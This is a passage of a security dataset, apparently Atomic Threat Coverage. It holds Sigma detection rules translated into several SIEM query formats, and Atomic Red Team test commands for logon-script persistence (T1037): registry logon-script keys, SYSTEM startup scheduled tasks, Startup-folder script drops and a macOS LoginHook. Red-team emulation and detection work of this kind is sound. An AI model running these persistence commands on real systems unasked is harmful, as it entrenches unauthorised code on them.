Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Taskmgr-as-LOCAL_SYSTEM <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Taskmgr as LOCAL_SYSTEM\",\\n    \"description\": \"Detects the creation of taskmgr.exe process in context of LOCAL_SYSTEM\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1036\"\\n    ],\\n    \"query\": \"(User:\\\\\"NT\\\\\\\\ AUTHORITY\\\\\\\\\\\\\\\\SYSTEM\\\\\" AND Image.keyword:*\\\\\\\\\\\\\\\\taskmgr.exe)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(User:\\\\\"NT\\\\\\\\ AUTHORITY\\\\\\\\\\\\\\\\SYSTEM\\\\\" AND Image.keyword:*\\\\\\\\\\\\\\\\taskmgr.exe)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Taskmgr as LOCAL_SYSTEM\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(User:\"NT AUTHORITY\\\\\\\\SYSTEM\" AND Image.keyword:*\\\\\\\\taskmgr.exe)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(User=\"NT AUTHORITY\\\\\\\\SYSTEM\" Image=\"*\\\\\\\\taskmgr.exe\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" User=\"NT AUTHORITY\\\\\\\\SYSTEM\" Image=\"*\\\\\\\\taskmgr.exe\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*NT AUTHORITY\\\\SYSTEM)(?=.*.*\\\\taskmgr\\\\.exe))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Taskmgr as Parent\nid: 3d7679bd-0c00-440c-97b0-3f204273e6c7\nstatus: experimental\ndescription: Detects the creation of a process from Windows task manager\ntags:\n    - attack.defense_evasion\n    - attack.t1036\nauthor: Florian Roth\ndate: 2018/03/13\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage: '*\\taskmgr.exe'\n    filter:\n        Image:\n            - '*\\resmon.exe'\n            - '*\\mmc.exe'\n            - '*\\taskmgr.exe'\n    condition: selection and not filter\nfields:\n    - Image\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Administrative activity\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Taskmgr as Parent\nid: 3d7679bd-0c00-440c-97b0-3f204273e6c7\nstatus: experimental\ndescription: Detects the creation of a process from Windows task manager\ntags:\n    - attack.defense_evasion\n    - attack.t1036\nauthor: Florian Roth\ndate: 2018/03/13\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage: '*\\taskmgr.exe'\n    filter:\n        Image:\n            - '*\\resmon.exe'\n            - '*\\mmc.exe'\n            - '*\\taskmgr.exe'\n    condition: selection and not filter\nfields:\n    - Image\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Administrative activity\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(ParentImage.keyword:*\\\\\\\\taskmgr.exe AND (NOT (Image.keyword:(*\\\\\\\\resmon.exe OR *\\\\\\\\mmc.exe OR *\\\\\\\\taskmgr.exe))))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Taskmgr-as-Parent <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Taskmgr as Parent\",\\n    \"description\": \"Detects the creation of a process from Windows task manager\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1036\"\\n    ],\\n    \"query\": \"(ParentImage.keyword:*\\\\\\\\\\\\\\\\taskmgr.exe AND (NOT (Image.keyword:(*\\\\\\\\\\\\\\\\resmon.exe OR *\\\\\\\\\\\\\\\\mmc.exe OR *\\\\\\\\\\\\\\\\taskmgr.exe))))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(ParentImage.keyword:*\\\\\\\\\\\\\\\\taskmgr.exe AND (NOT (Image.keyword:(*\\\\\\\\\\\\\\\\resmon.exe OR *\\\\\\\\\\\\\\\\mmc.exe OR *\\\\\\\\\\\\\\\\taskmgr.exe))))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Taskmgr as Parent\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n            Image = {{_source.Image}}\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(ParentImage.keyword:*\\\\\\\\taskmgr.exe AND (NOT (Image.keyword:(*\\\\\\\\resmon.exe *\\\\\\\\mmc.exe *\\\\\\\\taskmgr.exe))))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(ParentImage=\"*\\\\\\\\taskmgr.exe\" NOT ((Image=\"*\\\\\\\\resmon.exe\" OR Image=\"*\\\\\\\\mmc.exe\" OR Image=\"*\\\\\\\\taskmgr.exe\"))) | table Image,CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ParentImage=\"*\\\\\\\\taskmgr.exe\"  -(Image IN [\"*\\\\\\\\resmon.exe\", \"*\\\\\\\\mmc.exe\", \"*\\\\\\\\taskmgr.exe\"]))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\taskmgr\\\\.exe)(?=.*(?!.*(?:.*(?=.*(?:.*.*\\\\resmon\\\\.exe|.*.*\\\\mmc\\\\.exe|.*.*\\\\taskmgr\\\\.exe))))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: System File Execution Location Anomaly\nid: e4a6b256-3e47-40fc-89d2-7a477edd6915\nstatus: experimental\ndescription: Detects a Windows program executable started in a suspicious folder\nreferences:\n    - https://twitter.com/GelosSnake/status/934900723426439170\nauthor: Florian Roth, Patrick Bareiss\ndate: 2017/11/27\ntags:\n    - attack.defense_evasion\n    - attack.t1036\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image:\n            - '*\\svchost.exe'\n            - '*\\rundll32.exe'\n            - '*\\services.exe'\n            - '*\\powershell.exe'\n            - '*\\regsvr32.exe'\n            - '*\\spoolsv.exe'\n            - '*\\lsass.exe'\n            - '*\\smss.exe'\n            - '*\\csrss.exe'\n            - '*\\conhost.exe'\n            - '*\\wininit.exe'\n            - '*\\lsm.exe'\n            - '*\\winlogon.exe'\n            - '*\\explorer.exe'\n            - '*\\taskhost.exe' \n    filter:\n        Image:\n            - 'C:\\Windows\\System32\\\\*'\n            - 'C:\\Windows\\SysWow64\\\\*'\n            - 'C:\\Windows\\explorer.exe'\n            - 'C:\\Windows\\winsxs\\\\*'\n    condition: selection and not filter\nfalsepositives:\n    - Exotic software\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: System File Execution Location Anomaly\nid: e4a6b256-3e47-40fc-89d2-7a477edd6915\nstatus: experimental\ndescription: Detects a Windows program executable started in a suspicious folder\nreferences:\n    - https://twitter.com/GelosSnake/status/934900723426439170\nauthor: Florian Roth, Patrick Bareiss\ndate: 2017/11/27\ntags:\n    - attack.defense_evasion\n    - attack.t1036\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image:\n            - '*\\svchost.exe'\n            - '*\\rundll32.exe'\n            - '*\\services.exe'\n            - '*\\powershell.exe'\n            - '*\\regsvr32.exe'\n            - '*\\spoolsv.exe'\n            - '*\\lsass.exe'\n            - '*\\smss.exe'\n            - '*\\csrss.exe'\n            - '*\\conhost.exe'\n            - '*\\wininit.exe'\n            - '*\\lsm.exe'\n            - '*\\winlogon.exe'\n            - '*\\explorer.exe'\n            - '*\\taskhost.exe' \n    filter:\n        Image:\n            - 'C:\\Windows\\System32\\\\*'\n            - 'C:\\Windows\\SysWow64\\\\*'\n            - 'C:\\Windows\\explorer.exe'\n            - 'C:\\Windows\\winsxs\\\\*'\n    condition: selection and not filter\nfalsepositives:\n    - Exotic software\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image.keyword:(*\\\\\\\\svchost.exe OR *\\\\\\\\rundll32.exe OR *\\\\\\\\services.exe OR *\\\\\\\\powershell.exe OR *\\\\\\\\regsvr32.exe OR *\\\\\\\\spoolsv.exe OR *\\\\\\\\lsass.exe OR *\\\\\\\\smss.exe OR *\\\\\\\\csrss.exe OR *\\\\\\\\conhost.exe OR *\\\\\\\\wininit.exe OR *\\\\\\\\lsm.exe OR *\\\\\\\\winlogon.exe OR *\\\\\\\\explorer.exe OR *\\\\\\\\taskhost.exe) AND (NOT (Image.keyword:(C\\\\:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\* OR C\\\\:\\\\\\\\Windows\\\\\\\\SysWow64\\\\\\\\* OR C\\\\:\\\\\\\\Windows\\\\\\\\explorer.exe OR C\\\\:\\\\\\\\Windows\\\\\\\\winsxs\\\\\\\\*))))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/System-File-Execution-Location-Anomaly <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"System File Execution Location Anomaly\",\\n    \"description\": \"Detects a Windows program executable started in a suspicious folder\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1036\"\\n    ],\\n    \"query\": \"(Image.keyword:(*\\\\\\\\\\\\\\\\svchost.exe OR *\\\\\\\\\\\\\\\\rundll32.exe OR *\\\\\\\\\\\\\\\\services.exe OR *\\\\\\\\\\\\\\\\powershell.exe OR *\\\\\\\\\\\\\\\\regsvr32.exe OR *\\\\\\\\\\\\\\\\spoolsv.exe OR *\\\\\\\\\\\\\\\\lsass.exe OR *\\\\\\\\\\\\\\\\smss.exe OR *\\\\\\\\\\\\\\\\csrss.exe OR *\\\\\\\\\\\\\\\\conhost.exe OR *\\\\\\\\\\\\\\\\wininit.exe OR *\\\\\\\\\\\\\\\\lsm.exe OR *\\\\\\\\\\\\\\\\winlogon.exe OR *\\\\\\\\\\\\\\\\explorer.exe OR *\\\\\\\\\\\\\\\\taskhost.exe) AND (NOT (Image.keyword:(C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\SysWow64\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\explorer.exe OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\winsxs\\\\\\\\\\\\\\\\*))))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image.keyword:(*\\\\\\\\\\\\\\\\svchost.exe OR *\\\\\\\\\\\\\\\\rundll32.exe OR *\\\\\\\\\\\\\\\\services.exe OR *\\\\\\\\\\\\\\\\powershell.exe OR *\\\\\\\\\\\\\\\\regsvr32.exe OR *\\\\\\\\\\\\\\\\spoolsv.exe OR *\\\\\\\\\\\\\\\\lsass.exe OR *\\\\\\\\\\\\\\\\smss.exe OR *\\\\\\\\\\\\\\\\csrss.exe OR *\\\\\\\\\\\\\\\\conhost.exe OR *\\\\\\\\\\\\\\\\wininit.exe OR *\\\\\\\\\\\\\\\\lsm.exe OR *\\\\\\\\\\\\\\\\winlogon.exe OR *\\\\\\\\\\\\\\\\explorer.exe OR *\\\\\\\\\\\\\\\\taskhost.exe) AND (NOT (Image.keyword:(C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\SysWow64\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\explorer.exe OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\winsxs\\\\\\\\\\\\\\\\*))))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'System File Execution Location Anomaly\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image.keyword:(*\\\\\\\\svchost.exe *\\\\\\\\rundll32.exe *\\\\\\\\services.exe *\\\\\\\\powershell.exe *\\\\\\\\regsvr32.exe *\\\\\\\\spoolsv.exe *\\\\\\\\lsass.exe *\\\\\\\\smss.exe *\\\\\\\\csrss.exe *\\\\\\\\conhost.exe *\\\\\\\\wininit.exe *\\\\\\\\lsm.exe *\\\\\\\\winlogon.exe *\\\\\\\\explorer.exe *\\\\\\\\taskhost.exe) AND (NOT (Image.keyword:(C\\\\:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\* C\\\\:\\\\\\\\Windows\\\\\\\\SysWow64\\\\\\\\* C\\\\:\\\\\\\\Windows\\\\\\\\explorer.exe C\\\\:\\\\\\\\Windows\\\\\\\\winsxs\\\\\\\\*))))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((Image=\"*\\\\\\\\svchost.exe\" OR Image=\"*\\\\\\\\rundll32.exe\" OR Image=\"*\\\\\\\\services.exe\" OR Image=\"*\\\\\\\\powershell.exe\" OR Image=\"*\\\\\\\\regsvr32.exe\" OR Image=\"*\\\\\\\\spoolsv.exe\" OR Image=\"*\\\\\\\\lsass.exe\" OR Image=\"*\\\\\\\\smss.exe\" OR Image=\"*\\\\\\\\csrss.exe\" OR Image=\"*\\\\\\\\conhost.exe\" OR Image=\"*\\\\\\\\wininit.exe\" OR Image=\"*\\\\\\\\lsm.exe\" OR Image=\"*\\\\\\\\winlogon.exe\" OR Image=\"*\\\\\\\\explorer.exe\" OR Image=\"*\\\\\\\\taskhost.exe\") NOT ((Image=\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\*\" OR Image=\"C:\\\\\\\\Windows\\\\\\\\SysWow64\\\\\\\\*\" OR Image=\"C:\\\\\\\\Windows\\\\\\\\explorer.exe\" OR Image=\"C:\\\\\\\\Windows\\\\\\\\winsxs\\\\\\\\*\")))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image IN [\"*\\\\\\\\svchost.exe\", \"*\\\\\\\\rundll32.exe\", \"*\\\\\\\\services.exe\", \"*\\\\\\\\powershell.exe\", \"*\\\\\\\\regsvr32.exe\", \"*\\\\\\\\spoolsv.exe\", \"*\\\\\\\\lsass.exe\", \"*\\\\\\\\smss.exe\", \"*\\\\\\\\csrss.exe\", \"*\\\\\\\\conhost.exe\", \"*\\\\\\\\wininit.exe\", \"*\\\\\\\\lsm.exe\", \"*\\\\\\\\winlogon.exe\", \"*\\\\\\\\explorer.exe\", \"*\\\\\\\\taskhost.exe\"]  -(Image IN [\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\*\", \"C:\\\\\\\\Windows\\\\\\\\SysWow64\\\\\\\\*\", \"C:\\\\\\\\Windows\\\\\\\\explorer.exe\", \"C:\\\\\\\\Windows\\\\\\\\winsxs\\\\\\\\*\"]))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*.*\\\\svchost\\\\.exe|.*.*\\\\rundll32\\\\.exe|.*.*\\\\services\\\\.exe|.*.*\\\\powershell\\\\.exe|.*.*\\\\regsvr32\\\\.exe|.*.*\\\\spoolsv\\\\.exe|.*.*\\\\lsass\\\\.exe|.*.*\\\\smss\\\\.exe|.*.*\\\\csrss\\\\.exe|.*.*\\\\conhost\\\\.exe|.*.*\\\\wininit\\\\.exe|.*.*\\\\lsm\\\\.exe|.*.*\\\\winlogon\\\\.exe|.*.*\\\\explorer\\\\.exe|.*.*\\\\taskhost\\\\.exe))(?=.*(?!.*(?:.*(?=.*(?:.*C:\\\\Windows\\\\System32\\\\\\\\.*|.*C:\\\\Windows\\\\SysWow64\\\\\\\\.*|.*C:\\\\Windows\\\\explorer\\\\.exe|.*C:\\\\Windows\\\\winsxs\\\\\\\\.*))))))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1037/T1037.yaml", "command": "echo cmd /c \"echo Art \"Logon Script\" atomic test was successful. >> %USERPROFILE%\\desktop\\T1037-log.txt\" > #{script_path}\nREG.exe ADD HKCU\\Environment /v UserInitMprLogonScript /t REG_SZ /d \"#{script_path}\"\n", "name": null}, {"source": "atomics/T1037/T1037.yaml", "command": "echo cmd /c \"echo Art \"Logon Script\" atomic test was successful. >> %USERPROFILE%\\desktop\\T1037-log.txt\" > $env:SystemRoot\\Temp\\art.bat\nREG.exe ADD HKCU\\Environment /v UserInitMprLogonScript /t REG_SZ /d \"$env:SystemRoot\\Temp\\art.bat\"\n", "name": null}, {"source": "atomics/T1037/T1037.yaml", "command": "schtasks /create /tn \"T1037_OnLogon\" /sc onlogon /tr \"cmd.exe /c calc.exe\"\nschtasks /create /tn \"T1037_OnStartup\" /sc onstart /ru system /tr \"cmd.exe /c calc.exe\"\n", "name": null}, {"source": "atomics/T1037/T1037.yaml", "command": "Copy-Item $PathToAtomicsFolder\\T1037\\src\\vbsstartup.vbs \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"\nCopy-Item $PathToAtomicsFolder\\T1037\\src\\vbsstartup.vbs \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"\ncscript.exe \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"\ncscript.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"\n", "name": null}, {"source": "atomics/T1037/T1037.yaml", "command": "Copy-Item $PathToAtomicsFolder\\T1037\\src\\jsestartup.jse \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"\nCopy-Item $PathToAtomicsFolder\\T1037\\src\\jsestartup.jse \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"\ncscript.exe /E:Jscript \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"\ncscript.exe /E:Jscript \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"\n", "name": null}, {"source": "atomics/T1037/T1037.yaml", "command": "Copy-Item $PathToAtomicsFolder\\T1037\\src\\batstartup.bat \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"\nCopy-Item $PathToAtomicsFolder\\T1037\\src\\batstartup.bat \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"\nStart-Process \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"\nStart-Process \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"\n", "name": null}, {"source": "SysmonHunter - Logon Scripts", "command": "\\Environment\\UserInitMprLogonScript", "name": null}, {"source": "SysmonHunter - Logon Scripts", "command": "\\Environment\\UserInitMprLogonScript", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/persistence/multi/desktopfile", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/persistence/multi/desktopfile", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/persistence/osx/loginhook", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/persistence/osx/loginhook", "name": "Empire Module Command"}], "command_list": ["echo cmd /c \"echo Art \"Logon Script\" atomic test was successful. >> %USERPROFILE%\\desktop\\T1037-log.txt\" > #{script_path}\nREG.exe ADD HKCU\\Environment /v UserInitMprLogonScript /t REG_SZ /d \"#{script_path}\"\n", "echo cmd /c \"echo Art \"Logon Script\" atomic test was successful. >> %USERPROFILE%\\desktop\\T1037-log.txt\" > $env:SystemRoot\\Temp\\art.bat\nREG.exe ADD HKCU\\Environment /v UserInitMprLogonScript /t REG_SZ /d \"$env:SystemRoot\\Temp\\art.bat\"\n", "schtasks /create /tn \"T1037_OnLogon\" /sc onlogon /tr \"cmd.exe /c calc.exe\"\nschtasks /create /tn \"T1037_OnStartup\" /sc onstart /ru system /tr \"cmd.exe /c calc.exe\"\n", "Copy-Item $PathToAtomicsFolder\\T1037\\src\\vbsstartup.vbs \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"\nCopy-Item $PathToAtomicsFolder\\T1037\\src\\vbsstartup.vbs \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"\ncscript.exe \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"\ncscript.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"\n", "Copy-Item $PathToAtomicsFolder\\T1037\\src\\jsestartup.jse \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"\nCopy-Item $PathToAtomicsFolder\\T1037\\src\\jsestartup.jse \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"\ncscript.exe /E:Jscript \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"\ncscript.exe /E:Jscript \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"\n", "Copy-Item $PathToAtomicsFolder\\T1037\\src\\batstartup.bat \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"\nCopy-Item $PathToAtomicsFolder\\T1037\\src\\batstartup.bat \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"\nStart-Process \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"\nStart-Process \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"\n", "\\Environment\\UserInitMprLogonScript", "\\Environment\\UserInitMprLogonScript", "python/persistence/multi/desktopfile", "python/persistence/multi/desktopfile", "python/persistence/osx/loginhook", "python/persistence/osx/loginhook"], "technique_id": "T1037", "parsed_datasets": [{"Atomic Red Team Test - Logon Scripts": {"display_name": "Logon Scripts", "atomic_tests": [{"description": "Adds a registry value to run batch script created in the C:\\Windows\\Temp directory.\n", "supported_platforms": ["windows"], "name": "Logon Scripts", "input_arguments": {"script_command": {"default": "echo Art \"Logon Script\" atomic test was successful. >> %USERPROFILE%\\desktop\\T1037-log.txt", "type": "String", "description": "Command To Execute"}, "script_path": {"default": "$env:SystemRoot\\Temp\\art.bat", "type": "String", "description": "Path to .bat file"}}, "executor": {"elevation_required": false, "command": "echo cmd /c \"#{script_command}\" > #{script_path}\nREG.exe ADD HKCU\\Environment /v UserInitMprLogonScript /t REG_SZ /d \"#{script_path}\"\n", "name": "command_prompt", "cleanup_command": "REG.exe DELETE HKCU\\Environment /v UserInitMprLogonScript /f\ndel #{script_path} >nul 2>nul\ndel \"%USERPROFILE%\\desktop\\T1037-log.txt\" >nul 2>nul\n"}}, {"description": "Run an exe on user logon or system startup\n", "supported_platforms": ["windows"], "name": "Scheduled Task Startup Script", "executor": {"elevation_required": true, "command": "schtasks /create /tn \"T1037_OnLogon\" /sc onlogon /tr \"cmd.exe /c calc.exe\"\nschtasks /create /tn \"T1037_OnStartup\" /sc onstart /ru system /tr \"cmd.exe /c calc.exe\"\n", "name": "command_prompt", "cleanup_command": "schtasks /delete /tn \"T1037_OnLogon\" /f\nschtasks /delete /tn \"T1037_OnStartup\" /f\n"}}, {"description": "Mac logon script\n", "supported_platforms": ["macos"], "name": "Logon Scripts - Mac", "executor": {"steps": "1. Create the required plist file\n\n    sudo touch /private/var/root/Library/Preferences/com.apple.loginwindow.plist\n\n2. Populate the plist with the location of your shell script\n\n    sudo defaults write com.apple.loginwindow LoginHook /Library/Scripts/AtomicRedTeam.sh\n\n3. Create the required plist file in the target user's Preferences directory\n\n\t  touch /Users/$USER/Library/Preferences/com.apple.loginwindow.plist\n\n4. Populate the plist with the location of your shell script\n\n\t  defaults write com.apple.loginwindow LoginHook /Library/Scripts/AtomicRedTeam.sh\n", "name": "manual"}}, {"description": "vbs files can be placed in and ran from the startup folder to maintain persistance\n", "supported_platforms": ["windows"], "name": "Supicious vbs file run from startup Folder", "executor": {"elevation_required": true, "command": "Copy-Item $PathToAtomicsFolder\\T1037\\src\\vbsstartup.vbs \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"\nCopy-Item $PathToAtomicsFolder\\T1037\\src\\vbsstartup.vbs \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"\ncscript.exe \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"\ncscript.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"\n", "name": "powershell", "cleanup_command": "Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\" -ErrorAction Ignore\nRemove-Item \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\" -ErrorAction Ignore\n"}}, {"description": "jse files can be placed in and ran from the startup folder to maintain persistance\n", "supported_platforms": ["windows"], "name": "Supicious jse file run from startup Folder", "executor": {"elevation_required": true, "command": "Copy-Item 